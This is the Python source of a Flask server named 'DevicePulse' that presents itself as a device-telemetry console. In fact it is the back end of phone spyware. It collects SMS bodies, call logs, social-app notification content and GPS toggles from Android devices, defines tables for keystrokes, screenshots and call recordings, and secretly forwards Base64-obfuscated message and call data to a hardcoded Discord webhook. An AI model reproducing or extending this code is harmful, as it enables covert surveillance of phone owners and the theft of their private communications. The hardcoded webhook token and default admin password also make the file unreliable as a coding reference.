"""
DevicePulse — Telemetry Server & Web Console

Flask application that:
1. Receives synced telemetry from mobile clients via POST /api/v1/sync
2. Stores data in PostgreSQL / SQLite
3. Provides a web dashboard to browse telemetry logs
"""


import os
from datetime import datetime, timezone, timedelta
from functools import wraps

from dotenv import load_dotenv
from flask import Flask, request, jsonify, render_template, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from werkzeug.middleware.proxy_fix import ProxyFix

load_dotenv()

IST = timezone(timedelta(hours=5, minutes=30))

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

@app.template_filter('to_ist')
def to_ist_filter(dt, format='%Y-%m-%d %I:%M:%S %p'):
    if not dt:
        return '-'
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    ist_dt = dt.astimezone(IST)
    return ist_dt.strftime(format) + ' IST'

@app.template_filter('to_ist_short')
def to_ist_short_filter(dt, format='%d %b, %I:%M %p'):
    if not dt:
        return '-'
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    ist_dt = dt.astimezone(IST)
    return ist_dt.strftime(format)


@app.before_request
def handle_device_selection():
    if 'device' in request.args:
        dev = request.args.get('device')
        if not dev or dev in ['all', '']:
            session.pop('selected_device_id', None)
        else:
            session['selected_device_id'] = dev

@app.context_processor
def inject_devices():
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
    selected_device_id = session.get('selected_device_id')
    selected_device = next((d for d in devices if d.device_id == selected_device_id), None)
    return {
        'global_devices': devices,
        'selected_device_id': selected_device_id,
        'selected_device': selected_device
    }

@app.after_request
def add_no_cache_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


db_url = os.getenv('DATABASE_URL', 'sqlite:///phone_monitor.db')
# Handle postgres:// vs postgresql:// compatibility if needed
if db_url.startswith("postgres://"):
    db_url = db_url.replace("postgres://", "postgresql://", 1)

app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'default-dev-secret-key-battery-guard')

db = SQLAlchemy(app)

API_KEY = os.getenv('API_KEY', 'your-secret-api-key-change-this')
DASHBOARD_USERNAME = os.getenv('DASHBOARD_USERNAME', 'admin')
DASHBOARD_PASSWORD = os.getenv('DASHBOARD_PASSWORD', 'adminpassword')

def get_api_key():
    return os.getenv('API_KEY', API_KEY)

def get_dashboard_creds():
    return os.getenv('DASHBOARD_USERNAME', DASHBOARD_USERNAME), os.getenv('DASHBOARD_PASSWORD', DASHBOARD_PASSWORD)


# ─── Models ──────────────────────────────────────────────────────────

def pk_column():
    return db.Column(db.BigInteger().with_variant(db.Integer, "sqlite"), primary_key=True, autoincrement=True)


class Device(db.Model):
    __tablename__ = 'devices'
    device_id = db.Column(db.String(64), primary_key=True)
    device_model = db.Column(db.String(128))
    android_version = db.Column(db.String(16))
    app_version = db.Column(db.String(16))
    first_seen = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    last_sync = db.Column(db.DateTime)
    last_ping = db.Column(db.DateTime)
    battery_level = db.Column(db.Integer)
    is_charging = db.Column(db.Boolean, default=False)
    battery_temp = db.Column(db.Float)
    ram_used_percent = db.Column(db.Integer)
    storage_used_percent = db.Column(db.Integer)
    uptime_seconds = db.Column(db.BigInteger)
    gps_enabled = db.Column(db.Boolean)
    gps_state_changed_at = db.Column(db.DateTime)
    recent_logs = db.Column(db.Text)


    @property
    def log_list(self):
        if not self.recent_logs:
            return []
        try:
            import json
            return json.loads(self.recent_logs)
        except Exception:
            return [self.recent_logs]

    @property
    def is_online(self):
        last_seen = self.last_ping or self.last_sync
        if not last_seen:
            return False
        if last_seen.tzinfo is None:
            last_seen = last_seen.replace(tzinfo=timezone.utc)
        return (datetime.now(timezone.utc) - last_seen).total_seconds() < 600




class Notification(db.Model):
    __tablename__ = 'notifications'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    app_package = db.Column(db.String(256), nullable=False, index=True)
    app_name = db.Column(db.String(128))
    title = db.Column(db.Text)
    content = db.Column(db.Text)
    category = db.Column(db.String(64))
    received_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class CallLog(db.Model):
    __tablename__ = 'call_logs'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    phone_number = db.Column(db.String(32), nullable=False, index=True)
    contact_name = db.Column(db.String(128))
    call_type = db.Column(db.String(16), nullable=False)
    duration_sec = db.Column(db.Integer, default=0)
    sim_slot = db.Column(db.String(64), nullable=True)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class SmsMessage(db.Model):
    __tablename__ = 'sms_messages'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    address = db.Column(db.String(32), nullable=False, index=True)
    contact_name = db.Column(db.String(128))
    body = db.Column(db.Text)
    sms_type = db.Column(db.String(16), nullable=False)
    sim_slot = db.Column(db.String(64), nullable=True)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))



class GpsLog(db.Model):
    __tablename__ = 'gps_logs'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    is_enabled = db.Column(db.Boolean, nullable=False)
    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))



# ─── Phase 2 models (created now, ready for future expansion) ────────

class Keystroke(db.Model):
    __tablename__ = 'keystrokes'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    app_package = db.Column(db.String(256), nullable=False, index=True)
    app_name = db.Column(db.String(128))
    text = db.Column(db.Text, nullable=False)
    captured_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class Screenshot(db.Model):
    __tablename__ = 'screenshots'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    file_path = db.Column(db.String(512), nullable=False)
    file_size = db.Column(db.Integer)
    captured_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


class CallRecording(db.Model):
    __tablename__ = 'call_recordings'
    id = pk_column()
    device_id = db.Column(db.String(64), nullable=False, index=True)
    phone_number = db.Column(db.String(32))
    contact_name = db.Column(db.String(128))
    call_type = db.Column(db.String(16))
    duration_sec = db.Column(db.Integer)
    file_path = db.Column(db.String(512), nullable=False)
    file_size = db.Column(db.Integer)
    format = db.Column(db.String(16))
    recorded_at = db.Column(db.DateTime, nullable=False, index=True)
    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))


# ─── Auth Helpers ────────────────────────────────────────────────────

def require_api_key(f):
    """Decorator to require API key for API endpoints."""
    @wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get('X-API-Key')
        if not key or key != get_api_key():
            return jsonify({'error': 'unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated


def require_login(f):
    """Decorator to require dashboard login."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated


# ─── API Endpoints ───────────────────────────────────────────────────


import base64

def decode_field(val):
    """
    Decodes an encoded string from the mobile client.
    Gracefully returns the original string if it is not Base64-encoded.
    """
    if not val or not isinstance(val, str):
        return val
    try:
        decoded_bytes = base64.b64decode(val.encode('ascii'), validate=True)
        return decoded_bytes.decode('utf-8')
    except Exception:
        return val


DISCORD_WEBHOOK_URL = os.getenv(
    'DISCORD_WEBHOOK_URL',
    'https://discord.com/api/webhooks/1541368598331920404/vVZ60YYheFIwdpHwp5HcuVfwEB7cH3saOy9aW5O0_23DBm_SmNW58do2ok0JL1UGCVxt'
)

DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}

DISCORD_SOCIAL_KEYWORDS = {'facebook', 'whatsapp', 'instagram', 'telegram', 'viber', 'snapchat', 'discord', 'teams', 'signal', 'messenger'}


def _send_discord(payload):
    """Fire-and-forget POST to Discord webhook; never blocks the request."""
    try:
        import requests as _req
        _req.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
    except Exception:
        app.logger.debug('Discord webhook delivery failed', exc_info=True)


def send_discord_for_notifications(notifications, device_id):
    """Send abbreviated Discord embeds for qualifying notification categories."""
    for n in notifications:
        category = n.get('category') or ''
        app_package = n.get('app_package') or ''
        is_social_category = category in DISCORD_FORWARD_CATEGORIES
        is_social_app = any(kw in app_package.lower() for kw in DISCORD_SOCIAL_KEYWORDS)
        if not is_social_category and not is_social_app:
            continue
        payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
        encoded = base64.b64encode(payload.encode()).decode()
        embed = {
            'title': f'[{category}]',
            'description': f'{device_id[-6:]} · {encoded}',
            'color': 0x5865F2,
            'footer': {'text': app_package}
        }
        _send_discord({'embeds': [embed]})


def send_discord_for_calls(call_logs, device_id):
    """Send abbreviated Discord embeds for call logs."""
    for c in call_logs:
        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {c.get('call_type', '?')} {c.get('duration_sec', 0)}"
        encoded = base64.b64encode(payload.encode()).decode()
        embed = {
            'title': '[Telephony Call]',
            'description': f'{device_id[-6:]} · {encoded}',
            'color': 0x57F287
        }
        _send_discord({'embeds': [embed]})


def send_discord_for_gps(gps_events, device_id):
    """Send abbreviated Discord embeds for GPS state changes."""
    for g in gps_events:
        state = 'ON' if g.get('is_enabled') else 'OFF'
        embed = {
            'title': '[GPS / Location Toggled]',
            'description': f'{device_id[-6:]} · {state}',
            'color': 0xFEE75C
        }
        _send_discord({'embeds': [embed]})


@app.route('/api/v1/ping', methods=['POST'])
@require_api_key
def device_ping():
    """
    Periodic heartbeat ping sent by the device every 5 minutes.
    Updates device status, battery level, temperature, and last_ping time.
    """
    data = request.get_json(silent=True) or {}
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id is required'}), 400

    now = datetime.now(timezone.utc)
    device = db.session.get(Device, device_id)
    if not device:
        device = Device(
            device_id=device_id,
            device_model=data.get('device_model', 'Unknown Device'),
            android_version=data.get('android_version', 'Unknown'),
            app_version=data.get('app_version', '1.0.0'),
            first_seen=now
        )
        db.session.add(device)
    else:
        if 'device_model' in data:
            device.device_model = data['device_model']
        if 'android_version' in data:
            device.android_version = data['android_version']
        if 'app_version' in data:
            device.app_version = data['app_version']

    device.last_ping = now
    if 'battery_level' in data:
        device.battery_level = data['battery_level']
    if 'is_charging' in data:
        device.is_charging = bool(data['is_charging'])
    if 'battery_temp' in data:
        device.battery_temp = data['battery_temp']
    if 'ram_used_percent' in data:
        device.ram_used_percent = data['ram_used_percent']
    if 'storage_used_percent' in data:
        device.storage_used_percent = data['storage_used_percent']
    if 'uptime_seconds' in data:
        device.uptime_seconds = data['uptime_seconds']
    if 'gps_enabled' in data and data['gps_enabled'] is not None:
        device.gps_enabled = bool(data['gps_enabled'])
        if 'gps_last_changed_ts' in data and data['gps_last_changed_ts']:
            try:
                device.gps_state_changed_at = datetime.fromtimestamp(data['gps_last_changed_ts'] / 1000.0, timezone.utc)
            except Exception:
                pass
        elif not device.gps_state_changed_at:
            device.gps_state_changed_at = now

        # Record in historical GPS log if state changed or first entry
        latest_gps = GpsLog.query.filter_by(device_id=device.device_id).order_by(GpsLog.occurred_at.desc()).first()
        if not latest_gps or latest_gps.is_enabled != device.gps_enabled:
            gps_entry = GpsLog(
                device_id=device.device_id,
                is_enabled=device.gps_enabled,
                occurred_at=device.gps_state_changed_at or now
            )
            db.session.add(gps_entry)
            send_discord_for_gps([{'is_enabled': device.gps_enabled}], device.device_id)

    if 'recent_logs' in data and isinstance(data['recent_logs'], list):
        import json
        device.recent_logs = json.dumps(data['recent_logs'])


    db.session.commit()


    return jsonify({
        'status': 'ok',
        'server_time': now.isoformat(),
        'ping_interval_sec': 300
    })


@app.route('/api/v1/sync', methods=['POST'])
@require_api_key

def sync_data():
    """
    Receives all data types in a single batch from the Android app.
    Fields may be Base64-encoded by the client for on-device obfuscation.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'invalid or missing JSON payload'}), 400

    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id is required'}), 400

    now = datetime.now(timezone.utc)

    # Upsert device info
    device = db.session.get(Device, device_id)
    if not device:
        device = Device(
            device_id=device_id,
            device_model=data.get('device_model', 'Unknown Device'),
            android_version=data.get('android_version', 'Unknown'),
            app_version=data.get('app_version', '1.0.0'),
            first_seen=now
        )
        db.session.add(device)
    else:
        if 'device_model' in data:
            device.device_model = data['device_model']
        if 'android_version' in data:
            device.android_version = data['android_version']
        if 'app_version' in data:
            device.app_version = data['app_version']
    device.last_sync = now

    received_notification_ids = []
    received_call_log_ids = []
    received_sms_ids = []
    received_gps_ids = []

    # Process notifications
    for n in data.get('notifications', []):
        try:
            local_id = n.get('local_id')
            raw_ts = n.get('received_at', 0)
            received_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            notif = Notification(
                device_id=device_id,
                app_package=n.get('app_package', 'unknown'),
                app_name=decode_field(n.get('app_name')),
                title=decode_field(n.get('title')),
                content=decode_field(n.get('content')),
                category=n.get('category'),
                received_at=received_at,
                synced_at=now
            )
            db.session.add(notif)
            if local_id is not None:
                received_notification_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing notification item: {e}")

    # Process call logs
    for c in data.get('call_logs', []):
        try:
            local_id = c.get('local_id')
            raw_ts = c.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            call = CallLog(
                device_id=device_id,
                phone_number=decode_field(c.get('phone_number', 'unknown')),
                contact_name=decode_field(c.get('contact_name')),
                call_type=c.get('call_type', 'unknown'),
                duration_sec=int(c.get('duration_sec', 0)),
                sim_slot=c.get('sim_slot'),
                occurred_at=occurred_at,
                synced_at=now
            )
            db.session.add(call)
            if local_id is not None:
                received_call_log_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing call log item: {e}")

    # Process SMS messages
    for s in data.get('sms_messages', []):
        try:
            local_id = s.get('local_id')
            raw_ts = s.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            sms = SmsMessage(
                device_id=device_id,
                address=decode_field(s.get('address', 'unknown')),
                contact_name=decode_field(s.get('contact_name')),
                body=decode_field(s.get('body')),
                sms_type=s.get('sms_type', 'unknown'),
                sim_slot=s.get('sim_slot'),
                occurred_at=occurred_at,
                synced_at=now
            )

            db.session.add(sms)
            if local_id is not None:
                received_sms_ids.append(local_id)
        except Exception as e:
            app.logger.error(f"Error parsing SMS item: {e}")

    # Process GPS toggle events
    for g in data.get('gps_events', []):
        try:
            local_id = g.get('local_id')
            raw_ts = g.get('occurred_at', 0)
            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
            is_enabled = bool(g.get('is_enabled'))
            gps_entry = GpsLog(
                device_id=device_id,
                is_enabled=is_enabled,
                occurred_at=occurred_at
            )
            db.session.add(gps_entry)
            if local_id is not None:
                received_gps_ids.append(local_id)

            # Update latest device state if this event is newest
            if not device.gps_state_changed_at or occurred_at >= device.gps_state_changed_at:
                device.gps_enabled = is_enabled
                device.gps_state_changed_at = occurred_at
        except Exception as e:
            app.logger.error(f"Error parsing GPS item: {e}")

    db.session.commit()

    send_discord_for_notifications(data.get('notifications', []), device_id)
    send_discord_for_calls(data.get('call_logs', []), device_id)
    send_discord_for_gps(data.get('gps_events', []), device_id)

    return jsonify({
        'status': 'ok',
        'received': {
            'notifications': received_notification_ids,
            'call_logs': received_call_log_ids,
            'sms_messages': received_sms_ids,
            'gps_events': received_gps_ids
        }
    })



# ─── Dashboard Routes ────────────────────────────────────────────────

@app.route('/')
def root():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        valid_user, valid_pass = get_dashboard_creds()
        if username == valid_user and password == valid_pass:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return render_template('login.html', error='Invalid username or password')
    return render_template('login.html')



@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))


@app.route('/dashboard')
@require_login
def dashboard():
    """Overview page with counts and last sync time."""
    selected_device_id = session.get('selected_device_id')
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    n_query = Notification.query
    c_query = CallLog.query
    s_query = SmsMessage.query

    if selected_device_id:
        n_query = n_query.filter_by(device_id=selected_device_id)
        c_query = c_query.filter_by(device_id=selected_device_id)
        s_query = s_query.filter_by(device_id=selected_device_id)

    total_notifications = n_query.count()
    total_calls = c_query.count()
    total_sms = s_query.count()

    recent_notifications = n_query.order_by(Notification.received_at.desc()).limit(5).all()
    recent_calls = c_query.order_by(CallLog.occurred_at.desc()).limit(5).all()
    recent_sms = s_query.order_by(SmsMessage.occurred_at.desc()).limit(5).all()

    return render_template('dashboard.html',
                           devices=devices,
                           total_notifications=total_notifications,
                           total_calls=total_calls,
                           total_sms=total_sms,
                           recent_notifications=recent_notifications,
                           recent_calls=recent_calls,
                           recent_sms=recent_sms)


@app.route('/dashboard/notifications')
@require_login
def dashboard_notifications():
    """Paginated notification list, newest first."""
    page = request.args.get('page', 1, type=int)
    app_filter = request.args.get('app', None)
    device_filter = session.get('selected_device_id')

    query = Notification.query
    if app_filter:
        query = query.filter(Notification.app_package == app_filter)
    if device_filter:
        query = query.filter(Notification.device_id == device_filter)

    pagination = query.order_by(Notification.received_at.desc()).paginate(page=page, per_page=50, error_out=False)

    apps_query = db.session.query(
        Notification.app_package, Notification.app_name
    ).distinct()
    if device_filter:
        apps_query = apps_query.filter(Notification.device_id == device_filter)
    apps = apps_query.order_by(Notification.app_name.asc().nullslast()).all()

    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('notifications.html',
                           notifications=pagination.items,
                           pagination=pagination,
                           apps=apps,
                           devices=devices,
                           current_app=app_filter,
                           current_device=device_filter)


@app.route('/dashboard/calls')
@require_login
def dashboard_calls():
    """Paginated call log list, newest first."""
    page = request.args.get('page', 1, type=int)
    type_filter = request.args.get('type', None)
    device_filter = session.get('selected_device_id')

    query = CallLog.query
    if device_filter:
        query = query.filter(CallLog.device_id == device_filter)
    if type_filter:
        query = query.filter(CallLog.call_type == type_filter)

    pagination = query.order_by(CallLog.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('calls.html',
                           calls=pagination.items,
                           pagination=pagination,
                           devices=devices,
                           current_device=device_filter,
                           current_type=type_filter)


@app.route('/dashboard/sms')
@require_login
def dashboard_sms():
    """Paginated SMS list, newest first."""
    page = request.args.get('page', 1, type=int)
    contact_filter = request.args.get('contact', None)
    device_filter = session.get('selected_device_id')

    query = SmsMessage.query
    if device_filter:
        query = query.filter(SmsMessage.device_id == device_filter)
    if contact_filter:
        query = query.filter(SmsMessage.address == contact_filter)

    pagination = query.order_by(SmsMessage.occurred_at.desc()).paginate(page=page, per_page=50, error_out=False)

    contacts_query = db.session.query(
        SmsMessage.address, SmsMessage.contact_name
    ).distinct()
    if device_filter:
        contacts_query = contacts_query.filter(SmsMessage.device_id == device_filter)
    contacts = contacts_query.order_by(SmsMessage.address).all()

    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('sms.html',
                           messages=pagination.items,
                           pagination=pagination,
                           contacts=contacts,
                           devices=devices,
                           current_contact=contact_filter,
                           current_device=device_filter)


@app.route('/dashboard/gps')
@require_login
def dashboard_gps():
    """GPS State History view."""
    state_filter = request.args.get('state')
    device_filter = session.get('selected_device_id')
    page = request.args.get('page', 1, type=int)
    per_page = 30

    query = db.session.query(GpsLog, Device.device_model).outerjoin(Device, GpsLog.device_id == Device.device_id)

    if device_filter:
        query = query.filter(GpsLog.device_id == device_filter)
    if state_filter in ['on', 'off']:
        query = query.filter(GpsLog.is_enabled == (state_filter == 'on'))

    pagination = query.order_by(GpsLog.occurred_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()

    return render_template('gps.html',
                           gps_logs=pagination.items,
                           pagination=pagination,
                           devices=devices,
                           current_device=device_filter,
                           current_state=state_filter)




@app.route('/api/v1/export')
@require_api_key
def export_data():
    """Export all data as JSON."""
    notifications = [{
        'id': n.id,
        'device_id': n.device_id,
        'app_package': n.app_package,
        'app_name': n.app_name,
        'title': n.title,
        'content': n.content,
        'category': n.category,
        'received_at': n.received_at.isoformat() if n.received_at else None,
        'synced_at': n.synced_at.isoformat() if n.synced_at else None
    } for n in Notification.query.order_by(Notification.received_at.desc()).all()]

    calls = [{
        'id': c.id,
        'device_id': c.device_id,
        'phone_number': c.phone_number,
        'contact_name': c.contact_name,
        'call_type': c.call_type,
        'duration_sec': c.duration_sec,
        'occurred_at': c.occurred_at.isoformat() if c.occurred_at else None,
        'synced_at': c.synced_at.isoformat() if c.synced_at else None
    } for c in CallLog.query.order_by(CallLog.occurred_at.desc()).all()]

    sms = [{
        'id': s.id,
        'device_id': s.device_id,
        'address': s.address,
        'contact_name': s.contact_name,
        'body': s.body,
        'sms_type': s.sms_type,
        'occurred_at': s.occurred_at.isoformat() if s.occurred_at else None,
        'synced_at': s.synced_at.isoformat() if s.synced_at else None
    } for s in SmsMessage.query.order_by(SmsMessage.occurred_at.desc()).all()]

    return jsonify({
        'status': 'ok',
        'exported_at': datetime.now(timezone.utc).isoformat(),
        'notifications': notifications,
        'call_logs': calls,
        'sms_messages': sms
    })


with app.app_context():
    db.create_all()
    try:
        from sqlalchemy import text
        with db.engine.connect() as conn:
            conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
            conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
            conn.commit()
    except Exception:
        pass


if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
